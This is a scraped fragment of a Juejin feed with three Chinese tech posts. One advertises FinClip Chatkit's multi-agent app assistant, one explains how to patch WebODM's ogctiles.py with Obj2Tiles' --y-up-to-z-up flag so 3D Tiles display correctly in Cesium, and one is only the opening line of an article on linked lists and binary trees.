            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479918322696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FinClip
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:45:32.000Z" title="Tue Dec 16 2025 08:45:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e132f429408e4eb7b3870978feb1b8ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479748&amp;x-signature=7hk%2FLh65bo9LfBNMcGQdsFbTgOg%3D" alt="图片" loading="lazy"/></p>
<p>你是不是也经常有这样的体验？ </p>
<p>“每次打开银行App，想好好做个理财规划，但“智能助手”只会机械地列出热门产品。 </p>
<p>想查个航班行程，它展示完时间和价格，就没了下文。 </p>
<p>打开电商App，上周刚买过的东西，这周又重复推荐了。” </p>
<p>这不是某个App的问题，数据显示，超过70%的用户认为App的“智能服务”并不智能。</p>
<p>用户要的从来不是功能列表，而是能真正解决问题的服务。 </p>
<p>当一个需求涉及多个环节时，单一的AI助手能回答每个独立问题，却给不出完整的解决方案和行动。 </p>
<p>因此当前大部分APP的“智能服务”是割裂的，用户需要自己拼凑信息；AI只会答不会做执行，也难以调用外部资源。</p>
<p><strong>未来App需要一个智能团队</strong></p>
<p><strong>而不是聊天机器人</strong></p>
<p>针对以上APP的AI应用现状，FinClip Chatkit带来了不同的思路：与其让一个AI包揽所有事，不如组建一支懂得协同的“智能团队”。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa2aae03d7f44185916639586b6f4345~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479748&amp;x-signature=v3jgrwcRHkZE294%2FhY7DEj8kPCk%3D" alt="图片" loading="lazy"/></p>
<p>FinClip Chatkit技术的核心在于三层架构。 </p>
<p>第一层，“需求理解专家”，能深度分析用户的真实意图，结合历史行为和当前场景，把模糊的需求转化为明确的任务。</p>
<p>第二层，“专业执行团队”。这里有不同的智能体各司其职——有的擅长数据分析，有的精通产品匹配，有的专注风险控制。它们可以并行工作，又实时交换信息。</p>
<p>第三层,“服务整合顾问”。负责汇总各方成果，生成完整的解决方案，并用用户能理解的方式呈现出来。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e2810ed055e41a2b5c72cf6afe53edc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479748&amp;x-signature=AwHzLyyx1JQ0TOLDARCVKTWZwbg%3D" alt="图片" loading="lazy"/></p>
<p>为了让这个“团队”高效协作，FinClip Chatkit做了几个关键设计。无需重构，只需接入AI会话SDK，就能接上大模型和业务系统。</p>
<p>智能中枢，能自动识别用户的意图，调度最合适的智能体组合；上下文工程，能够记住用户在不同时期的不同需求，形成对用户的完整画像；安全沙箱设计，则让每个智能体独立运行，关键操作需要多重验证，保障数据隐私和安全。</p>
<p><strong>FinClip Chatkit</strong></p>
<p><strong>让不同智能体真正懂业务</strong></p>
<p>未来的APP，在FinClip Chatkit的加持下，各行业的移动应用场景，将会发生以下改变。 </p>
<p>金融机构APP，过去用户问理财，系统只会推产品清单。现在，当用户说“想为孩子存教育金”时，多个智能体会协同工作：有的计算未来资金需求，有的评估风险承受能力，有的筛选合适方案，有的优化财务结构。用户拿到的不再是产品列表，而是完整的财务规划。 </p>
<p>航空公司APP，过去订完机票服务就结束了，现在基于智能协作，系统会主动建议出行时间、推荐匹配的酒店、安排接送机服务，甚至提供目的地特色活动推荐。 </p>
<p>零售行业APP，当用户说“周末要去野餐”时，系统不再简单推荐商品，而是协同多个智能体：分析野餐所需物品、推荐搭配方案、匹配优惠促销、甚至提供场地预订服务。 </p>
<p>汽车服务领域APP，用户描述“车辆异响”后，智能团队会协同诊断故障原因、推荐最近服务网点、检查配件库存、安排代步车辆。一次简单的反馈，获得的是完整的解决方案。 </p>
<p>智能服务的未来，不在于让机器更像人，而在于让服务更懂人。</p>
<p>如果你的App也面临这样的困境，功能齐全但体验割裂，投入巨大但收效有限，AI不够智能，欢迎留言咨询FinClip Chatkit解决方案。</p>
<p><strong>关于FinClip Chatkit</strong></p>
<p>Chatkit是凡泰极客FinClip超级应用智能平台的一次重大能力升级，它能助力企业构建具备深度上下文感知、流式生成原生UI的超级App。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WebODM生成3DTiles模型在Cesium地图上会垂直显示问题解决(y-up-to-z-up)]]></title>    <link>https://juejin.cn/post/7584273076645347334</link>    <guid>https://juejin.cn/post/7584273076645347334</guid>    <pubDate>2025-12-16T08:43:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584273076645347334" data-draft-id="7584059298696691753" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WebODM生成3DTiles模型在Cesium地图上会垂直显示问题解决(y-up-to-z-up)"/> <meta itemprop="keywords" content="前端,GIS"/> <meta itemprop="datePublished" content="2025-12-16T08:43:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="奇山流云"/> <meta itemprop="url" content="https://juejin.cn/user/1301420147226910"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WebODM生成3DTiles模型在Cesium地图上会垂直显示问题解决(y-up-to-z-up)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1301420147226910/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    奇山流云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:43:56.000Z" title="Tue Dec 16 2025 08:43:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">问题描述</h4>
<blockquote>
<p>3dtiles模型生成后,在Cesium中显示时,y轴向上,z轴向上,x轴向上,导致模型显示异常,无法正常显示</p>
</blockquote>
<h4 data-id="heading-1">问题原因</h4>
<blockquote>
<p><code>WebODM</code>是先生成glb模型,而后再进行3dtiles转换;
glb模型一般是y轴向上,所以转换后的3dtiles模型也是Y轴向上;
<code>WebODM</code>生成的3dtile是使用其自研的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenDroneMap%2FObj2Tiles" target="_blank" title="https://github.com/OpenDroneMap/Obj2Tiles" ref="nofollow noopener noreferrer">Obj2Tiles🔗</a>进行转换的,但<code>Obj2Tiles</code>其实是有<code>z-up</code>的api配置;
由于<code>WebODM</code>在调用<code>Obj2Tiles</code>的时候没有做<code>z-up</code>的配置选项,故而需要修改调用源代码;</p>
</blockquote>
<h4 data-id="heading-2">解决思路</h4>
<blockquote>
<p>修改<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenDroneMap%2FODM%2Ftree%2Fmaster" target="_blank" title="https://github.com/OpenDroneMap/ODM/tree/master" ref="nofollow noopener noreferrer">ODM🔗</a>仓库内的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenDroneMap%2FODM%2Fblob%2Fmaster%2Fopendm%2Fogctiles.py" target="_blank" title="https://github.com/OpenDroneMap/ODM/blob/master/opendm/ogctiles.py" ref="nofollow noopener noreferrer">ogctiles.py🔗</a>代码,如下:</p>
</blockquote>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-comment"># .......上文忽略......</span>

      <span class="hljs-keyword">try</span>:
        kwargs = {
            <span class="hljs-string">'input'</span>: input_obj,
            <span class="hljs-string">'output'</span>: output_path,
            <span class="hljs-string">'divisions'</span>: divisions,
            <span class="hljs-string">'lat'</span>: lat,
            <span class="hljs-string">'lon'</span>: lon,
            <span class="hljs-string">'alt'</span>: alt,
        }
        system.run(<span class="hljs-string">'Obj2Tiles "{input}" "{output}" --divisions {divisions} --lat {lat} --lon {lon} --alt {alt} '</span>.<span class="hljs-built_in">format</span>(**kwargs))

    <span class="hljs-comment"># 改为以下↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span>

    <span class="hljs-keyword">try</span>:
        kwargs = {
            <span class="hljs-string">'input'</span>: input_obj,
            <span class="hljs-string">'output'</span>: output_path,
            <span class="hljs-string">'divisions'</span>: divisions,
            <span class="hljs-string">'lat'</span>: lat,
            <span class="hljs-string">'lon'</span>: lon,
            <span class="hljs-string">'alt'</span>: alt,
        }
        CmdStr = <span class="hljs-string">'Obj2Tiles "{input}" "{output}" --divisions {divisions} --lat {lat} --lon {lon} --alt {alt}'</span>.<span class="hljs-built_in">format</span>(**kwargs)
        <span class="hljs-comment"># 方向转换,空格不可缺</span>
        CmdStr += <span class="hljs-string">' --y-up-to-z-up'</span>

        system.run(CmdStr)

  <span class="hljs-comment"># .......下文忽略......</span>
</code></pre>
<h4 data-id="heading-3">具体操作</h4>
<blockquote>
<p>WebODM安装参考: <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.genec.dev%2Fblog%2F2024%2F12%2F28%2Frunning-webodm-on-windows-via-wsl2%2F" target="_blank" title="https://blog.genec.dev/blog/2024/12/28/running-webodm-on-windows-via-wsl2/" ref="nofollow noopener noreferrer">透過WSL2在Windows執行WebODM🔗</a></p>
<p>在docker中安装好WebODM仓库后,使用docker命令行进入 名称为 <code>webodm-node-odm-1</code> 的容器中, cd进入仓库目录 /code/opendm,然后修改其文件下的ogctiles.py文件</p>
</blockquote>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">1. 查看容器列表,找到odm服务容器,一般名称都为 webodm-node-odm-1</span>
docker ps -a 
<span class="hljs-meta prompt_">
# </span><span class="bash">2. 将容器内的文件复制到服务器目录下</span>
docker cp webodm-node-odm-1:/code/opendm/ogctiles.py /服务器某个目录/ogctiles.py 
<span class="hljs-meta prompt_">
# </span><span class="bash">3. 将文件中的代码添加--y-up-to-z-up,如上述代码</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">4. 将修改后的文件复制回容器中</span>
docker cp /服务器某个目录/ogctiles.py webodm-node-odm-1:/code/opendm/ogctiles.py
<span class="hljs-meta prompt_">
# </span><span class="bash">5. 进入容器内部</span>
docker exec -it webodm-node-odm-1 bash
<span class="hljs-meta prompt_">
# </span><span class="bash">6. 查看文件是否已更改</span>
cat /code/opendm/ogctiles.py
<span class="hljs-meta prompt_">
# </span><span class="bash">7. 如未更改则重新复制,已更改则重启docker应用</span>

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3 链表 二叉树]]></title>    <link>https://juejin.cn/post/7584203412197441562</link>    <guid>https://juejin.cn/post/7584203412197441562</guid>    <pubDate>2025-12-16T08:17:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584203412197441562" data-draft-id="7584203412197392410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3 链表 二叉树"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T08:17:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="瘦的可以下饭了"/> <meta itemprop="url" content="https://juejin.cn/user/895474817042060"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3 链表 二叉树
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/895474817042060/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    瘦的可以下饭了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:17:19.000Z" title="Tue Dec 16 2025 08:17:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1小时+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>环形链表是链表中的一类特殊问题，它和链表反转一样，有着相对恒定的解题思路和适当的变体。如果你对它的特性和解法没有预先的了解和把握，那么前期的推导可能会花去你大量的时间。反过来看，只要我们能够掌握其核心思路，那么不管它怎么变化，大家都能在瞬间找到解题的“抓手”、进而给出正确的解答。</p>
